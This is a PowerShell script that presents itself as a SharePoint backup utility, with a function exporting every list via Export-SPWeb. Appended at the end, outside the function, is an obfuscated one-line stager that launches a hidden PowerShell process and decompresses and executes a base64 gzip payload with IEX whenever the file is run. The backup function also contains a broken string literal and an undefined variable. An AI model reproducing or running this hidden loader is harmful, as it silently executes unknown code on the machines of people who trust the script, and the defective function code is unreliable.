

function Backup-AllSPLists{



	[CmdletBinding()]
	param(
		[Parameter(Position=0, Mandatory=$true)]
		[String]
		$Path
	)
	
	
	
	
	if(-not (Get-PSSnapin "Microsoft.SharePoint.PowerShell" -ErrorAction SilentlyContinue)){Add-PSSnapin "Microsoft.SharePoint.PowerShell"}
	
	
	
	
    $SPSites = $SPWebApp | Get-SPsite -Limit all 

    foreach($SPSite in $SPSites){

        $SPWebs = $SPSite | Get-SPWeb -Limit all
        
        foreach ($SPWeb in $SPWebs){

            $SPLists = $SPWeb | foreach{$_.Lists}

            foreach($SPList in $SPLists){
                
                Write-Progress -Activity "Backup SharePoint lists" -status $SPList.title -percentComplete ([int]([array]::IndexOf($SPLists, $SPList)/$SPLists.Count*100))
                
                $RelativePath = $SPSite.HostName + "\" + $SPList.RootFolder.ServerRelativeUrl.Replace("/","\")
                $BackupPath = Join-Path -Path $Path -ChildPath $RelativePath

                if(!(Test-Path -path $BackupPath)){New-Item $BackupPath -Type Directory}

                $FileName = $SPList.Title + "
                $FilePath = Join-Path -Path $BackupPath -ChildPath $FileName
                
                Export-SPWeb -Identity $SPList.ParentWeb.Url -ItemUrl $SPList.RootFolder.ServerRelativeUrl -Path $FilePath  -IncludeVersions All -IncludeUserSecurity -Force -NoLogFile -CompressionSize 1000
                
            }
        }
    }
}
if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAJDDhFgCA7VW4W7aSBD+nUp9B6tCwlYJBkKTNlKlW2MMJJgABgPh0Gljr82GxevY6wTo9d1vDHZDr8ldr9KtErG7Mzs78803O/aSwBGUB5JDdDzqS1/evjnp4wivJbmweXIfWnxIxJVdkgpsND1XTk5AXsAXj9PtlEyY9FmS5ygMdb7GNFhcXjaSKCKBOKzLLSJQHJP1HaMklhXpT2myJBE5vbm7J46QvkiFP8otxu8wy9S2DewsiXSKAjeVdbmDU+fKVsiokIu//15U5qfVRbn5kGAWy0VrGwuyLruMFRXpq5JeONqGRC6a1Il4zD1RntDgrFYeBzH2SA+sPRKTiCV346ICocBfREQSBdJzUKmVg45chGk/4g5y3YjEcKTcCR75isiFIGGsJP0mzzMXhkkg6JqAXJCIhxaJHqlD4nIbBy4jQ+It5B55yiP/2UPy8SHQ6otIKUFmXvPV5G7CyOF4UfnR2+OUKjDytAIUX9++efvGy9ngBh+7x1yA2cl8PyfgqtznMd3rfZYqJcmE+7Dg0RaWhVGUEGUhzdM8zBcLqbCq+dPQKr1uoZqrg3I4NJ3Y3sHu3ObUXcCpLE0Fcm2YRuxbYuOl4tdZpxOPBkTfBnhNnZxY8kvwE4+RfbzlXK0H7snFTEBcnTDiY5FiWZLmPx5rrqn4dlZLKHNJhBxIYQxeQXaV7505pEcudgKTrAGvw7oIWfCAziTXzii8zW9P16BUbDAcxyWpn0A9OSXJIpgRtyShIKaZCCWC76fFZ3fNhAnq4Fjk5hbK3+DMrm3wIBZR4kAmAYKRFRKHYpYiUpLa1CXa1qJ+fn3xRTwamDEa+GDpEfIBOykOlkj5EYGnGReUskVEZx0ysgatfYUbDPtQz1lB7CmFfeIWX3E1p/yB3yk2OShHjkLCLcZFSbJpJOC9SHHO+PWrrhw9F8dONSKSpUnOK2mubUXK/0LAhildM6z2yEQCUDEivtZwTM7rlogAM/mdekMbCMasEzDT0Va0ip5otWPC/5iedbh+4V5f3bfVSN8sPdSJO2a7rw/a7frjlWXXhdXsiOt+R5jN6f29hdrD8UzcdlB7RCurWX0XXtGd1UXubKOe77TdU0Xb7O5915vpnudfeNaw+sGg3UljoFVquKs3k+5Ee9Iq9bhJn9oDOh6srgxxN7MZHnuqP61+wnTTje7tKjd3HYRayzNnd+XZraXpbmdt9dOkvkJNhBpB0zY0fj3TItRX7bGhDcZNbTCAvXNf9eqwx977vTRurKMP3fVwdReYyd3arqAWDa91C4Gt7kDbPGi2xpGPhtNOsMZLbWLX6G04HS5BboCL12ql3nHJjs8GYKzFEfaHoOM3as7SAx39PdLe93hcwyuwo4GOcfsAfs9Co89APhrXOLJZb4pR93ZrqGp11q+jdoVOWj5KTWJfG2AUP+o7Xa3aLncnH3ozT7Wn7ELVG6PwVoXx1Navndvq5uPNxcfuhNprjsaqar9L2QP0KcQb44gOrzUAE0fxEjOgCTzqed0aPDKy97nPaXpClrOuvSJRQBj0OeiEOd0RY9xJu8X+LYdOdegfCyjcMUzPai/OFOmbovLcQPKty8tb8BOqB1hd7pLAF8tSZXNWqUAXqGzqFYjy50Nr8HArp5ZKaRNJkckMs71hJS2jwt3MGRni/4YsK+Al/Lj/Btnz3j9IfwrGSmkf9A+732/8J0x/IfYJpgJ0LXiDGDk0yJchyAhy9FlxSA4wwMtG+ol3k4jTHnxv/AUtYsbgWgoAAA==''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

